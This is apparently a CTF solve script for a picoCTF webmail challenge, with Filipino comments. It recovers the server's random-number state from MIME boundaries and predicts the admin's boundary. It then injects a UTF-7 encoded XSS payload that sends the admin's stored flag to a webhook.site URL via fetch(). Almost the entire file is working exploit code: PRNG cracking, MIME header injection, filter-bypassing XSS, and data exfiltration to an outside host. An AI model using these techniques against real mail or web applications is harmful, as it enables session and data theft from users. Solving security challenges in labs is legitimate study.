import requests as req
from requests import Session
import re, base64, sys, tqdm
import z3_crack


url = "http://activist-birds.picoctf.net:56495"# remember na palitan itong link na to every time na nag open ka ng challenge. yung actual website na

def get_creds():
    return {'username':"user@ses","password":req.get(f"{url}/api/password").json()}

def login(creds) -> Session:
    r = req.post(f"{url}/api/login",json=creds)
    if r.status_code == 401:
        raise Exception("Invalid credentials")
    s = Session()
    s.headers.update({"token":r.json()})
    return s

def email(s: Session, id: str):
    return s.get(f"{url}/api/email/{id}").json()

def admin_bot(s: Session):
    r = s.post(f"{url}/api/admin_bot").json()
    assert r == "success"
    return r

def send(s: Session, to: str, subject: str, body: str):
    r = s.post(f"{url}/api/send", json = {
        "to": to,
        "subject": subject,
        "body": body
    })
    return r.json()

def get_boundary(s: Session) -> int:
    mail = email(s,send(s,"user@ses","Hi","Bro"))
    boundary = int(re.findall(r"===(\d+)==",mail['data'])[0])
    return boundary

# Step 1: Get session
s = login(get_creds())

# Step 2: Crack random state
ut = z3_crack.Untwister()
for _ in tqdm.tqdm(range(800)):
    b = bin(get_boundary(s))[2:].zfill(63)
    half1, half2 = b[:31], b[31:]
    half1 = half1 + '?'
    ut.submit(half2)
    ut.submit(half1)
r2 = ut.get_random()
if r2.getrandbits(63) != get_boundary(s):
    print("Boundary prediction failed.")
    sys.exit(1)

# Step 3: Predict admin's boundary
r2.getrandbits(63)  # skip one
admin_boundary = '%019d' % r2.getrandbits(63)

# Step 4: Prepare XSS payload
#url lng 
# itong nasa baba ay need din palitan  depende dun sa url ng webhooks mo, so need mo open ang website na webhook. tapos ang papalitan mo ay ganitong line fetch("https://webhook.site/a8302e65-e861-47f1-97cc-ef4497e7b700?"
js_to_run = """fetch("https://webhook.site/a8302e65-e861-47f1-97cc-ef4497e7b700?"+btoa(localStorage.getItem("flag")))"""
js_to_run = base64.b64encode(js_to_run.encode()).decode().replace("=","+AD0-")
payload = f"""hi

   --==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-eval(atob('{js_to_run}'))+ADs-+ACA-/+AD4-
   --==============={admin_boundary}==
"""
final_payload = f'hi=?ISO-8859-1?B?{base64.b64encode(payload.encode()).decode()}?=\nFrom : admin@ses'

# Step 5: Send payload and trigger admin bot
send(s,"admin@ses",final_payload,'Impossible W')
admin_bot(s)  # First trigger: admin replies to your email
admin_bot(s)  # Second trigger: admin views its own reply and executes XSS

print("Exploit sent! Check your listener for the flag.")
